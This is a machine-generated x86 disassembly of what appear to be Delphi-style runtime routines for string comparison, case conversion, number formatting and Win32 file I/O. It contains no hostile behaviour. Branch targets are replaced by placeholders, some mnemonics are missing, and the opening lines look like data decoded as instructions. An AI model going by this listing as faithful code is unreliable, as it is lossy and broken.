jb r-xdata
sbb [ 0x4078b83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jns r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
adc [ ecx + 0x45f13415 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add al ch
xor [ eax ] eax
lodsb [ esi ]
leave
inc eax
add [ esp + edx * 2 ] ah
add ah dl
js r-xdata
add [ ebx + 0x45fea815 ] cl
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
xor al 0xf1
inc ebp
add [ ebx + 0x34158910 ] cl
int1
inc ebp
arpl [ eax + 0x72 ] bp
outsd
dec ebp
jne r-xdata
add [ ecx + ecx * 8 + 0x54240040 ] ch
sub_407968
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407984
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
pop edi
pop esi
pop ebx
retn
sub_4079a8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c40
mov eax esi
pop esi
pop ebx
retn
sub_4079c8
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_4079f4
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4079c8
pop ebx
retn
sub_407a2c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045b8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407a68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045b8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407aa4
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407ad4
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407af4
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407b48
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407af4
test eax eax
jne r-xdata
sub_407b6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40422c
push eax
mov eax esi
call sub_40442c
push eax
mov eax ebx
call sub_40422c
push eax
mov eax ebx
call sub_40442c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407ba4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40422c
push eax
mov eax esi
call sub_40442c
push eax
mov eax ebx
call sub_40422c
push eax
mov eax ebx
call sub_40442c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407bf4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407c14
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40422c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f6c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_40448c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407c64
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40422c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40422c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407cc8
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407cde
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407cde
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407cde
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d14
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407cc8
mov edx esi
pop eax
call sub_40405c
add esp 0x10
pop esi
retn
sub_407d34
or cl cl
jne sub_407d68
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407d68
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407d68
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407d68
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e00
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407d34
mov edx esi
pop eax
call sub_40405c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407e28
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407cc8
mov edx esi
pop eax
call sub_40405c
add esp 0x20
pop esi
retn
xor edx edx
sub_407e50
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c60
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407984
sub_407ea4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c60
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_407ec4
mov eax [ rw-data ]
call sub_404d34
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404d34
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404ef0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fc0
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404ef0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fc0
sub_407f54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407bdc
test al al
je r-xdata
sub_407f90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4091ac
mov edx eax
test dl dl
je r-xdata
call sub_407ec4
push ebp
mov eax [ rw-data ]
call sub_404d3c
mov edx eax
mov eax [ rw-data ]
call sub_407f54
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404d3c
mov edx eax
mov eax [ rw-data ]
call sub_407f54
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_40802c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fc0
call sub_407ec4
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fc0
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fc0
jmp r-xdata
pop esi
pop ebx
retn
sub_408078
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40442c
push eax
call CreateFileA
sub_4080d0
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40442c
push eax
call CreateFileA
pop ebx
retn
sub_4080fc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408128
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408154
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408194
push ebx
push esi
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bc54
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4081c4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40422c
mov edi eax
mov eax ebx
call sub_40442c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4084c8
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bc54
cmp al 0x2
jne r-xdata
dec edi
sub_408214
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4081c4
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_40448c
pop edi
pop esi
pop ebx
retn
sub_40824c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4081c4
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403f6c
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_40448c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408294
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40442c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_40405c
add esp 0x108
pop esi
pop ebx
retn
sub_4082d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d10
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d10
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408380
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4083a8
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4083dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40422c
push eax
mov eax ebx
call sub_40442c
mov edx eax
mov eax esi
pop ecx
call sub_4083a8
pop esi
pop ebx
retn
sub_408400
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40442c
mov edx eax
mov ecx edi
mov eax ebx
call sub_4083a8
pop edi
pop esi
pop ebx
retn
sub_408420
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408444
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408484
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4084dc
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408564
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408344
mov esi eax
inc esi
mov eax esi
call sub_408544
mov ecx esi
mov edx ebx
call sub_408370
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4085a0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bc78
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408370
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407984
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408628
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40897f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40870a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408752
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40870a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40861c
pop edx
or edx edx
je r-xdata
sub_40870a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40897f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408752
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_40897f
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4085a0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408779 ]
mov ebx ecx
sub cl 0x44
je sub_407d34
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404194
jmp r-xdata
mov esi sub_4041f4
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407d34
sub cl 0x44
je sub_407cc8
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407cc8
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d34
mov ecx 0x10
cmp bl 0x58
je sub_407cc8
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4085f8
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408b38
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407cc8
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_4089a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408344
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408628
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4089e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408344
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408628
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408a34
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40422c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408628
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40405c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f6c
mov eax esi
mov edx ebx
call sub_4045b8
